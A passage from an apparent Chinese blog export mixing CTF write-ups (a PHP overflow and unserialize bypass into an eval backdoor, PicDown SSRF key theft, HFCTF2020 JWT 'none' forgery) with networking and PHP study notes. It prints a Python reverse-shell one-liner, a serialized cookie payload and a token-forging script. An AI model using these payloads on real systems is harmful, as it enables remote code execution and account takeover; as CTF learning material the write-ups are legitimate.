5.59nts&lt;?php$a[2147483647]=&quot;ccc&quot;;$a[]=&quot;bbb&quot;;var_dump($a); 输出： $a[]访问到的是当前最大数值索引的下一位 也就是说，在5.5.9nts版本下，2147483647就是数值索引的界限，而2147483647正是5.5.9版本中默认设置的整型最大值：PHP_INT_MAX:int(2147483647)。 这里的int，是有符号32位二进制可表示的最大数。 2^31-1=2147483647 如果超过了呢？ 这里会转化为范围更大的float储存…… 数组中溢出后就会回滚从int的最小值，于是会符合这样的规律： 0—2147483647 下标0~2147483647 2147483648—4294967296 下标-2147483648~0 4294967296—6442450943 下标 0~2147483647 下一个溢出为0的数字是：8589934592 这样使用似乎没什么问题，但如果是通过$a[]去获取就会产生报错，相关版本的题目是XCTF-favorite_number，可以研究研究。 较新的版本这里是7.3.4nts的php版本 123456789101112131415161718192021222324252627282930313233343536&lt;?phpecho &quot;PHP_INT_MAX：&quot;;var_dump(PHP_INT_MAX);echo &quot;&lt;br&gt;&quot;;echo &quot;PHP_INT_MIN：&quot;;var_dump(PHP_INT_MIN);echo &quot;&lt;br&gt;&quot;;echo &quot;PHP_INT_SIZE：&quot;;var_dump(PHP_INT_SIZE);$a =9223372036854775806;$b =9223372036854775806;echo &quot;&lt;br&gt;&quot;;var_dump(is_int($a));$a++;echo &quot;&lt;br&gt;&quot;;var_dump(is_int($a));$a++;echo &quot;&lt;br&gt;&quot;;echo &quot;is_int：&quot;;var_dump(is_int($a));echo &quot;&lt;br&gt;&quot;;echo &quot;is_float：&quot;;var_dump(is_float($a));echo &quot;&lt;br&gt;&quot;;echo $b;$b++;echo &quot;&lt;br&gt;&quot;;echo $b;$b++;echo &quot;&lt;br&gt;&quot;;echo $b; 1234567891011输出：PHP_INT_MAX：int(9223372036854775807)PHP_INT_MIN：int(-9223372036854775808)PHP_INT_SIZE：int(8)bool(true)bool(true)is_int：bool(false)is_float：bool(true)922337203685477580692233720368547758079.2233720368548E+18 同样会转化为float而不再属于整型，并会以科学计数法输出 这里的“int”，是有符号64位二进制可表示的最大数，或者说，我们更加熟悉的long long int。 2^63-1=9223372036854775807 较新的版本大概是提高了索引溢出的阈值…… 123456789&lt;?php$a[9223372036854775806]=&quot;haha&quot;;$a[] =1;var_dump($a);$a[] =1;var_dump($a); 最后的语句成功报错，根据这个方法： 123456789101112131415161718192021222324&lt;?phpinclude &quot;user.php&quot;;if($user=unserialize($_COOKIE[&quot;data&quot;])){ $count[++$user-&gt;count]=1; if($count[]=1){ $user-&gt;count+=1; setcookie(&quot;data&quot;,serialize($user)); }else{ eval($_GET[&quot;backdoor&quot;]); }}else{ $user=new User; $user-&gt;count=1; setcookie(&quot;data&quot;,serialize($user));}$a =new User();$a -&gt;count=9223372036854775806;$a =urlencode(serialize($a));echo $a;?&gt; 就可以成功绕过赋值判断 O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D 执行命令，来phpinfo看看敏感信息： ……上一个绕过disable_function的还是so劫持或者蚁剑插件……不是很会…… 看了dalao的wp，一直搞不好……原理倒是看了七七八八…… 然后……没有然后了……蹲一个好大佬的wp😢","link":"/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/"},{"title":"计算机网络","text":"计算机网络1.球鞋网络（Sneakernet）​ 可用于任何使用物理媒体在计算机之间传输数据的情况,而不是使用电子网络。早期通过纸卡或磁带传递计算机信息。现在用于大型资料的传输，如超大型的望远镜数据信息。 Never underestimate the bandwidth of a station wagon full of tapes hurtling down the highway.—Tanenbaum, Andrew S. (1989). 永远不要低估一台正在高速公路上飞驰又满载磁带的卡车的带宽 2.局域网​ 计算机近距离构成的小型网络称为局域网，LAN。 —以太网（Ethernet）：1.最简单形式：一条以太网电线连接数台计算机，数据以电信号的形式进行传递。以太网需要每台计算机有唯一的媒体访问控制地址，简称MAC地址。此地址放在头部，作为数据的前缀发送到网络中。如此，计算机只需要监听以太网电缆，只有识别出MAC地址，才会处理数据。 2.多台电脑共享一个传输媒介，这种方法叫“载波侦听多路访问”，简称“CSMA”。多态电脑进行监听载体，数据传输的速度称为“带宽”。 3.当位于同一网络的两台以上的计算机想要同时传输信息时会产生冲突，此时计算机检测到冲突并停止一定时间来避免冲突。一种方案是停止1s+随机时间，另一种是停止1s、2s、4s、8s……，这被称为“指数退避”。 4.冲突域：为了减少冲突和提高效率，需要减少同一载体中设备的数量。载体和其中的设备总称为“冲突域”。 5.交换机（switch）：使用交换机将一个冲突域拆分为两个冲突域，减少冲突域的范围。 交换机位于两个更小的网络之间，必要时才会在两个网络间传输数据。交换机会记录一个列表，列表上写着哪个MAC地址在哪边网络。这样，a—&gt;c 和 d—&gt;f的传输可以同时发生。但是，若f—&gt;a，则数据会通过交换机且两个网络都会被占用。 6.路由（routing）：大型网络中，从一个节点到另一个节点通常有许多路线。如果两个计算机或网路相隔遥远，那么传输会通过更多的关口也就是冲突域，导致冲突机会增加，产生高延迟。因此，最简单的方法是分配一条专用的通信线路，就像早期的电话。将线路转接到正确线路的方式为“电路交换”。 7.“报文交换”：报文交换是以报文为数据交换的单位，报文携带有目标地址、源地址等信息，在交换结点采用存储转发的传输方式。报文交换可以使用不同的路由(routes)，使通信跟具有容错性（不会因为某条线路受损而导致无法通信）。跳数：信息沿着路由跳转的次数叫“跳数”（记录跳数可以分辨出路由问题）。“跳数限制”：如果看到某条信息的跳数很高，就知道路由肯定出问题了。报文交换的缺点：报文比较大时会堵塞网络，英文只有把整个报文从一战转到下一站后，才能继续传递其他报文。解决方法是将大报文分成许多小块，称为：“数据包”。每个数据包都有目标地址，这样路由器知道应该发到哪里。报文的具体格式有“互联网协议”定义，简称IP，互联网协议标准创建于1970年代。 8.IP-互联网协议： ​ 数据包想在互联网上传输，需要符合“互联网协议”的标准。数据包头部储存的关于数据的数据也叫“元数据”。如果只包含地址，数据到达之后，计算机不知道把数据包给哪个程序使用。因此需要在IP之上开发更高级的协议。其中，最简单、最常见的叫“用户数据报协议”，简称为“UDP”。UDP包含不同的端口号，当一个数据包到达后，接收方会读取UDP头部中的端口号，并将数据交给拥有对应端口号的程序。 IP：负责把数据包送到正确的计算机； UDP：负责把数据包交给正确的程序。 UDP中还有一个“CHECKSUM”(校验和)，电脑会把所有数据加在一起算出“校验和”，UDP中，校验和以16位二进制储存。若超出，则舍去高位，保留低位。当接收者接受到数据包后，会重复这个步骤。若和头部校验和一致，代表一切正常。反之，代表数据出现了问题。 传输时的功率波动或线路故障都会导致数据的损失。UDP不提供数据修复或数据重发的机制，且发送方无法通过UDP得知数据包是否到达目的地。如果要求所有数据必须到达，就要用传输控制协议-TCP。 9.TCP ​ TCP头部也有“端口号”和”校验和”及一些特性： TCP数据包有序号：接收方可以根据序号把数据包排列成正确的顺序，即使到达的时间不同。 TCP要求接收方的电脑收到数据包，并且校验无误后，给发送方发一个确认码，简称“ACK”，代表收到了。 TCP会根据ACK发送的速度确认网络的拥挤状况，根据网络状况自动调整传输率。 UDP和TCP的应用场景不同：王者荣耀如何使用UDP做到低延迟（我就一搜还真有……不过是个噱头…… 10.DNS-域名系统 ​ 浏览器访问DNS服务器，询问地址的IP地址为多少。得到IP后服务器会给在这个地址发TCP请求。顶级域名（TLD）在域名的最顶部，如：.com和.gov。 然后是二级域名： 再下一层是子域名： 3.万维网1.各种超链接组成的巨大互联网络被称为万维网。为了能使网页相互连接，每个网页需要一个唯一的地址，这个地址被称为“统一资源定位器-URL”。当访问地址下服务器的指定资源时，会用到“超文本传输协议-HTTP”。如：我们想要访问“courses”，就会向服务器发送指令“GET /courses”。该指令以“ASCII编码”发送到服务器。服务器返回对应的网页资源，浏览器渲染后在屏幕上显示。HTTP中网页回应的报文中的状态码代表了访问结果： 状态码200：找到网页成功返回 400~499：客户端出错 “超文本”的储存和发送都基于普通文本的形式，纯文本无法标记出链接。为此，出现了HTML，超文本标记语言。 4.网络中立性简单来说，网络中立性是指应该平等对待所有的数据包。数据包的速度与优先级应该使一样的。","link":"/2021/02/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"title":"网鼎杯-2020-白虎组-PicDown","text":"摘要网鼎杯-2020-白虎组-PicDown /page 下有一个url参数，输入一个百度，发现下载了网页源码 试一下本地资源，结果还真读出来了……flag也是根目录……看一眼wp 当前运行的程序/proc/[pid]/cmdline：输出当前程序的完整命令行信息 我们可以读取当前web程序的运行：**/proc/self/cmdline** python app.py app.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route('/')def index(): return render_template('search.html')@app.route('/page')def page(): url = request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype='application/octet-stream') response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg' return response else: value = &quot;HACK ERROR!&quot; except: value = &quot;SOMETHING WRONG!&quot; return render_template('search.html', res=value)@app.route('/no_one_know_the_manager')def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return resif __name__ == '__main__': app.run(host='0.0.0.0', port=8080) 分析1234SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE) 打开/tmp/secret.txt，读入SECRET_KEY，并删除掉 （remove 123456789101112@app.route('/no_one_know_the_manager')def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return res 需要用key来getshell 文件描述符fd 文件描述符：File descriptor,简称fd，当应用程序请求内核打开/新建一个文件时，内核会返回一个文件描述符用于对应这个打开/新建的文件，其fd本质上就是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于UNIX、Linux这样的操作系统。 当一个新进程建立时，此进程将默认有 0，1，2 的文件描述符 文件描述符 缩写 描述 0 STDIN 标准输入 1 STDOUT 标准输出 2 STDERR 标准错误输出 其实我们与计算机之间的交互是我可以输入一些指令之后它给我一些输出。那么我们可以把上面表格中的文件描述符0理解为我和计算机交互时的输入，而这个输入默认是指向键盘的; 文件描述符1理解为我和计算机交互时的输出，而这个输出默认是指向显示器的；文件描述符2理解为我和计算机交互时，计算机出现错误时的输出，而这个输出默认是和文件描述符1指向一个位置; 所以0，1，2一般会指向终端 当这个进程去打开一个新的文件时： 如果此时去打开一个新的文件，它的文件描述符会是 3 。POSIX 标准要求每次打开文件时（含socket）必须使用当前进程中最小可用的文件描述符号 此文件描述符用来指定待读写的文件 ​ 而在进程的运行中，如果只是删除文件而不关闭(close)文件，此文件的文件描述符仍然存在，通过此访问符，依然可以访问到文件。 获取key 只打开了key文件，访问3即可读取到key /dev/fd /dev/fd是一个虚拟的“东西”，它实际指向/proc/self/fd。里面存放的是某个program所打开的文件描述符。不同的program所看到的/proc/self/fd不同。比如同一个账号在不同tty登录同一台服务器，a看到的/proc/self/fd实际是/proc/8231/fd，而b看到的是/proc/14133/fd /dev/fd里放的是文件描述符。默认的文件描述符有3个，0: stdin;1: stdout; 2: stderr。不同的program打开的文件描述符可能还不同。 当一个文件描述符被关闭后再被试图读写，就会报错。 这玩意似乎也行，是指向**/proc/self/fd**的…… 也有解释称：/dev/fd[0-7]：标准软驱 ——Linux /dev目录详解 啊……不是很懂 弹shell1python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xxxx',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot; 参考文章: 网鼎杯白虎组web - PicDown [V&amp;N2020 公开赛]CHECKIN 简析Linux中 /proc/pid 目录的各文件 彻底搞懂文件描述符fd 理解文件描述符 Linux /dev目录详解 /dev/fd 文件描述符 Linux: /dev/fd/详解","link":"/2021/08/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"},{"title":"项目学习初期小节","text":"摘要实验室Java项目，学习小结 话说这是信息安全实验室的开发项目，emmm…… 学习资源:求知讲堂Java视频 (98/120) JavaWeb视频教程 (31/68) Electron免费视频教程-从基础到实战 (1/17) 完，写小结的时候感觉知识已经开始忘了……🤣 描述：美容院管理系统 初期目标：实现其中的商品管理系统，即增、删、改、查 基础知识：Java基本知识的学习：求知讲堂Java视频 (98/120) 情况：掌握了基本的语法，了解了一些设计模式，面向对象编程深入我心，还需学习面向接口编程，需要复习…… 等我学完，整理下笔记发出来吧……挺多的 Javaweb知识学习：JavaWeb视频教程 (31/68) 情况：纠结好久，决定从jsp开始。学习了jsp、JavaBean、jdbc、servlet、基础架构知识；本次项目也是跟着视频学到一定程度打出来的…… 目前无笔记……懒爆……想把Java基础先整好 sql基础知识：无 情况：……半吊子不如的水平，基本了解也是学习sql注入的时候知道的，也涉及不到复杂sql……反而实际的开发让我更加了解了普通的注入场景——预编译😑 更加无笔记，学校计科专业甚至无数据库的课…… 前端基础知识： 情况：js学艺不精……之前看了十几节课，因有事而搁浅；css也学艺不精……目前是找到不错的模板，可以借助搜索引擎达到我想要的效果……刚刚能看懂的水平？ 害…… Electron？ 情况：只是为了便于浏览找到的客户端制作工具……只看了一集没什么好说的，js真心nb，我要好好学……还有python……感觉学不完了，我还天天玩🐕 玩手机……嘿嘿🤤 项目介绍 开发工具：eclipse 服务器：tomcat servlet：3.0 数据库：sqlite 桌面客户端：Electron 架构：——三层架构： ​ –表示层 ： 【前台】：jsp、css、js…… + 【后台】：servlet ​ –业务逻辑层： service ​ –数据访问层： Dao 现有功能：-对商品的增删改查 ​ -以商品编号为唯一主键进行统一管理 项目部署 run.exe由test.vbs编译而来 test.vbs无窗口调用test.bat bat依次设置环境变量、启动tomcat、启动electron 部署细节： 默认服务开在8888端口 会在D盘下生成project.db作为数据库 服务关闭需关闭 javaw 服务 与 electron 条件符合解压后即可使用 项目初期演示 qq录屏格式不对，由碰上断网……整了老半天……无语 想用七牛云做个图床，结果要备案域名，至少要七天…… 免费图床+streamja就挺香的，不知道费半天劲干什么🙄","link":"/2021/08/15/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/"},{"title":"HFCTF2020-EasyLogin","text":"摘要jwt 伪造，一下写好长……em，圆满 探索有/login /register /home 页面 在/home页面getflag，提示permission denied ，估计是要admin权限，admin账号无法注册 引入的 js： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD */function login() { const username = $(&quot;#username&quot;).val(); const password = $(&quot;#password&quot;).val(); const token = sessionStorage.getItem(&quot;token&quot;); $.post(&quot;/api/login&quot;, {username, password, authorization:token}) .done(function(data) { const {status} = data; if(status) { document.location = &quot;/home&quot;; } }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); });}function register() { const username = $(&quot;#username&quot;).val(); const password = $(&quot;#password&quot;).val(); $.post(&quot;/api/register&quot;, {username, password}) .done(function(data) { const { token } = data; sessionStorage.setItem('token', token); document.location = &quot;/login&quot;; }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); });}function logout() { $.get('/api/logout').done(function(data) { const {status} = data; if(status) { document.location = '/login'; } });}function getflag() { $.get('/api/flag').done(function(data) { const {flag} = data; $(&quot;#username&quot;).val(flag); }).fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); });} 抓包的时候发现很奇怪，似乎并没有账户数据。注册时会给一个授权(authorization)，base64解一下发现是 jwt，整个登录流程全靠jwt的验证，所以需要对jwt有所了解。 登陆成功后会返回一个base64加密后的用户数据和一个签名 1、前后端分离，即服务端和前端只关心自己的事。 2、使用 jwt 作为 api 认证凭证 3、服务端仅保存加密用的secret 深入了解Json Web Token之实战篇 将加密方式改为’none’ 下文实战中的 Juice Shop JWT issue 1 便是这个问题。之前谈及过nonsecure JWT的问题。 签名算法确保恶意用户在传输过程中不会修改JWT。但是标题中的alg字段可以更改为none。一些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+’.’+ payload +’.’）并将其提交给服务器。 此时我们知道，可以更改加密方法，不生成签名，绕过签名验证 但过不去，我们还需要看一个东西 反推解题我们还需要看 /controllers/api.js 这么个玩意……这也扫不出来啊…… 作为一个啥也不懂的菜鸡，如果从一个开发者的角度去思考…… 以下是个人理解…… koa 框架 /** 或许该用 koa-static 来处理静态文件 路径该怎么配置？不管了先填个根目录XD */ 在引入的js中，可以看到 koa-static，查看下koa的框架结构： 不包含 controller koa是否有必要实现controllers？ 如何实现？ 包含 controller Koa入门（一）—— Koa项目基础框架搭建 一步一步教你完成Koa2接口开发 koa后端模板 包含 controller 的 MVC 架构 从零开始搭建koa后台基础框架 （这个其实不是很合适 :D controller？由此可见 koa 框架并没有规定controller的存在，而controller在不同语境下有着不同的作用 MVC 的 C – controller MVC 于三层架构最大的区别 mvc与三层结构终极区别 趁机复习下开发时学到架构知识😋 上图明显的标出，javaweb中servlet的作用正是 controller servlet 作为 jsp 与 Model 数据交换的平台，上接 jsp，下接 **service **，按理来说是这样 这图不是很合适…… 访问不同的servlet，会使用不同的**业务逻辑(service)**，业务逻辑则根据原子化的数据访问层指向符合需求的数据操作 如果再次细化，以便面向需求灵活的调整，或者前后端分离、合作，又出现了 routes(路由)**，路由可以负责分发不同的请求，处理前端**。 而基于路由的分发，接口(api)**，作为请求后端**数据的地址与方式也出现了。 但怎么写呢？上面的例子中也有人把controller写到route中去…… 虽然题目说都放根目录…… REST api *rest api介绍*：rest api 是前后端分离最佳实践，是开发的一套标准或者说是一套规范，不是框架。 什么是REST呢?REST是Representational State Transfer（表现层状态转移）的缩写，它是由罗伊·菲尔丁（Roy Fielding）提出的，是用来描述创建HTTP API的标准方法的，他发现这四种常用的行为（查看（view），创建（create），编辑（edit）和删除（delete））都可以直接映射到HTTP 中已实现的GET,POST,PUT和DELETE方法。 —— 什么是REST API 怎样用通俗的语言解释REST，以及RESTful？ 实际上，接口开发的rest api规范十分接近答案 开发REST APIrest-hello 工程 12345678910111213141516171819202122232425262728293031rest-koa/|+- .vscode/| || +- launch.json &lt;-- VSCode 配置文件|+- controllers/| || +- api.js &lt;-- REST API| || +- index.js &lt;-- MVC Controllers|+- products.js &lt;-- 集中处理Product|+- rest.js &lt;-- 支持REST的middleware|+- app.js &lt;-- 使用koa的js|+- controller.js &lt;-- 扫描注册Controller|+- static-files.js &lt;-- 支持静态文件的middleware|+- templating.js &lt;-- 支持Nunjucks的middleware|+- package.json &lt;-- 项目描述文件|+- views/ &lt;-- Nunjucks模板|+- static/ &lt;-- 静态资源文件|+- node_modules/ &lt;-- npm安装的所有依赖包 ——开发REST API ——一步一步教你完成Koa2接口开发I 随着工程的增加及工程人员的增多、需求的增多，我们需要合理的规范来保证代码的管理效率与花费。这些结构上的细化便随之加深。 看着感觉十分河里啊……这都是经验啊~ 经验有了以上知识作为铺垫，再看引入的 app.js ，我们会发现，这似乎是通过api通信的…… 顺理成章地，如果我们能读取api的逻辑，应该就可以成功伪造jwt了！ 难点也就在于此了吧…… 即使用koa-static托管静态资源，接口也有可能被爬到吧……只有混淆或加密？ 不太懂欸…… 伪造/controllers/api.js： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586const crypto = require('crypto');const fs = require('fs')const jwt = require('jsonwebtoken')const APIError = require('../rest').APIError;module.exports = { 'POST /api/register': async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || username === 'admin'){ throw new APIError('register error', 'wrong username'); } if(global.secrets.length &gt; 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString('hex'); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'}); ctx.rest({ token: token }); await next(); }, 'POST /api/login': async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError('login error', 'username or password is necessary'); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) { throw new APIError('login error', 'no such secret id'); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: 'HS256'}); const status = username === user.username &amp;&amp; password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, 'GET /api/flag': async (ctx, next) =&gt; { if(ctx.session.username !== 'admin'){ throw new APIError('permission error', 'permission denied'); } const flag = fs.readFileSync('/flag').toString(); ctx.rest({ flag }); await next(); }, 'GET /api/logout': async (ctx, next) =&gt; { ctx.session.username = null; ctx.rest({ status: true }) await next(); }}; 要求用户名为admin，可以查到flag 登录验证： 123if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) { throw new APIError('login error', 'no such secret id'); } sid不能为null，不能不定义，且取值范围规定在0到global.secrets长度范围内 注意，此web应用的sid非加密所使用的sid，这里的sid似乎是一种标识…… 易受攻击的 JWT 库详见：Critical vulnerabilities in JSON Web Token libraries *TL;DR:**If you are using node-jsonwebtoken, pyjwt, namshi/jose, php-jwt or jsjwt with asymmetric keys (RS256, RS384, RS512, ES256, ES384, ES512) please update to the latest version. Seejwt.iofor more information on the vulnerable libraries.(Updated 2015-04-20)* Meet the “None” AlgorithmThenonealgorithm is a curious addition to JWT. It is intended to be used for situations where the integrity of the token has already been verified. Interestingly enough, it is one of only two algorithms that are mandatory to implement (the other beingHS256). Unfortunately, some libraries treated tokens signed with thenonealgorithm as a valid token with a verified signature. The result? Anyone can create their own “signed” tokens with whatever payload they want, allowing arbitrary account access on some systems. Putting together such a token is easy. Modify the above example header to contain&quot;alg&quot;: &quot;none&quot;instead ofHS256. Make any desired changes to the payload. Use an empty signature (i.e.signature = &quot;&quot;). Most (hopefully all?) implementations now have a basic check to prevent this attack: if a secret key was provided, then token verification will fail for tokens using thenonealgorithm. This is a good idea, but it doesn’t solve the underlying problem: attackers control the choice of algorithm. Let’s keep digging. 这里易受攻击指的是一些非对称加密算法的验证，……大概。 目前 JWT 应该是支持none的…… The none algorithm is a curious addition to JWT. Most (hopefully all?) implementations now have a basic check to prevent this attack 所以需要我们自行设计来预防空设的攻击 123if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) { throw new APIError('login error', 'no such secret id'); } 这其实就是一个验证，最后的最后也就是，绕过 这部分还是隐藏起来比较好？…… 绕过与其原理1const user = jwt.verify(token, secret, {algorithm: 'HS256'}); 最后我们将在这里对JWT进行验证，这也决定了我们的绕过方式 register中： 12345const secret = crypto.randomBytes(18).toString('hex');const secretid = global.secrets.length;global.secrets.push(secret)const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'}); secret 按顺序push进secrets中，sid正是从中取出secret值的索引 如果我们： 12345678910const jwt = require('jsonwebtoken');token = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjI5Mjk0NTU1LCJwYXNzd29yZCI6ImhoaCIsInNlY3JldGlkIjowfQ.'secret = 123const user = jwt.verify(token, secret, {algorithm: 'HS256'});console.log(user) 认证将会提示： 正如之前尝试的报错： 如果这样： 123456789const jwt = require('jsonwebtoken');token = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjI5Mjk0NTU1LCJwYXNzd29yZCI6ImhoaCIsInNlY3JldGlkIjowfQ.'secret = nullconst user = jwt.verify(token, secret, {algorithm: 'HS256'});console.log(user) 我们会得到： 正确的解析，即使指定了HS256 undefined，也可以成功，这就是上面过滤的 原因 我们只要控制sid，从secrets数组中取出一个不存在的值即可，使用小数或者给sid设置成一个空数组之类的…… 12345678import jwttoken = jwt.encode({&quot;secretid&quot;: [], &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;hhh&quot;, &quot;iat&quot;: 1629294555 }, algorithm=&quot;none&quot;,key=&quot;&quot;).decode(encoding='utf-8')print(token) 生成token登入admin 获取 flag~ 没想到写了这么多，感觉还是比较圆满的…… 参考文章:jwt详解 JWT 前后端分离应用，jwt的token服务端不保存、仅保存加密的secret，所有用户都是这一个secret 深入了解Json Web Token之概念篇 深入了解Json Web Token之实战篇 Security of JSON Web Tokens (JWT) - Cyber Polygon","link":"/2021/08/18/HFCTF2020-EasyLogin/"},{"title":"PHP笔记","text":"目前只有一些基础的语法知识，做一些笔记以供复习参考； 根据学习会补充函数部分。 PHP学习笔记： PHP可以做什么？为什么要学习PHP？“我可以用JavaScript来实现程序编写。”但JavaScript的能力是有限的，JavaScript通常运行在浏览器（客户端），它可以制作网页上面的特效：鼠标滑过背景改变颜色，还有网页上常见的鼠标滑过弹出菜单。但如果要让JavaScript实现显示“访问网站的总人数”，它就无能为力了，因为它只能获得客户端的信息，而“访问网站的总人数”是存储在服务器端的。所以就需要另外一种可以在服务器端运行的编程语言，PHP语言就是其中的一种，因为它可以运行在Web服务器端。 在学习PHP之前让我们来认识一下PHP及其功能。 1、运行在服务器端：学会了PHP，就可以指挥服务器给你干活，甚至是搞破坏^_^（千万不能真这么做咯），WEB网站的大部分数据都是存储在服务器端的，PHP就是用来处理这些存储在服务器的数据的（功能强大吧）。 2、跨平台：服务器可以是多种平台的服务器，比如Linux、Windows、Unix，你都可以指挥（不用怕只能指挥一种服务器啦吧）。 3、脚本语言：它是通过编写脚本，也就是一行行的计算机指令（也可以理解为特定的英文单词），来指挥服务器来工作的，因此，在编写PHP的过程其实就是与老外（服务器成老外啦）交流的过程，交流的语言就是PHP。…………………………………………………………………………………………………………………………………………………………………………………………………………1.PHP-Echo语句echo是PHP中的输出语句，可以把字符串输出（字符串用双引号括起来）。 如下代码： 注意echo关键字与字符串之间至少要有一个空格。如下面写法是不正确的： ……………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………2.不同于HTML和CSS，在php中我们可以做计算，比如我们写入echo 12*3计算机会计算出结果36。如下代码： ……………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………3.PHP-字符串一个字符串是用双引号括起来的一个词或一个句字，比如：“Hi,imooc！”。你可以用PHP语言输出把这个字符串输出，像这样： 也可以用单引号括起来，就像下面代码： 可以把两个字符用连接符连接起来，像这样: 注意:连接符可以连接多个字符串，上面的例子就是把一个字符串拆分为二个小字符串，然后用一个连接符连起来。 在php中字符串连接符是用点（.）来表示的，这一点比较特殊，其它语言中是用加号（+）来表示的，比如：JavaScirpt、Asp、C。 4.PHP语句结束符有的小伙伴们是不是已经注意在每一条PHP代码行结尾处都会有一个分号；对的，这点注意，在PHP编程中需要在每条语句的末尾加入分号；。但要注意，分号；一定在半角状态下输入噢。…………………………………………………………………………………………………………………………………………………………………………………………………………5.注释在PHP中也有注释语句：用双斜杠（//）来表示。其它语言中，Html中使用**&lt;!–注释语句–&gt;**，CSS中使用/注释语句/。如下面代码： 注释语句可以在PHP程序的任意位置（但注释语句一定要写在之间）。 注意：这个注释语句是为程序员准备的。…………………………………………………………………………………………………………………………………………………………………………………………………………6.PHP-什么是变量变量是用于存储值的，我们命令服务器去干活的时候，往往需要产生一些数据，需要临时性存放起来，方便取用。我们也可以理解为，变量就像一个购物袋，我们可以用来装苹果、榴莲（当然也可以用来装玫瑰），需要注意的是，一般情况下一个变量只能装一个（不要太贪心）值，除非是复合变量（后面变量类型时会介绍），当我们放进去一个苹果后，再放进榴莲的时候，苹果就被替换掉，再放入香蕉，那么榴莲就被替换了。…………………………………………………………………………………………………………………………………………………………………………………………………………7. PHP-如何定义变量定义变量就是向服务器的内存（服务器的内存，我们可以当做一个大仓库）申请空间（我们可以理解为一个子仓库），用来存储数据。这时候我们就需要用到变量名（也就是子仓库的名字）和变量值（需要存放的东西，苹果、榴莲、香蕉都可以）。纪晓岚就给自己的书房取了个名字“阅微草堂”，这个“阅微草堂”就是变量名，书房中放的东西就是变量值。语法如下： 解释一下，在“=”左边是变量名，右边是变量值，完成定义变量后，需要一个；告诉服务器这行指令已经结束。其中变量名必须通过$符号标识；“=”可不是我们平常所说的等号哦，在PHP中，=是赋值运算符(后面部分的小节会介绍)；在这里，var_name是变量名，“苹果”是变量值，它是一个字符串；n是变量名，10是变量值，它是一个整型（变量的数据类型的一种，后面部分的小节会介绍）。……………………………………………………………………………………………………………………………………………………………………………………………………………………8.PHP-变量名的命名规则变量名除了需要“$”进行标识外，还有一些规则需要遵守。就像拿到驾驶证以后，还得遵守交通规则。变量名的命名规则主要有三条： 1、变量名必须以字母或下划线 “_”开头，如”$_name”,”$name” ,”$name2”等，但是”$9name”是不对的。 2、变量名只能由字母、数字、以及“_”组成，还能包含汉字。如”$_qq”,”$qq308” ,”$my_apple”，“比如”$name我等”，但是”$name*”是不对的。 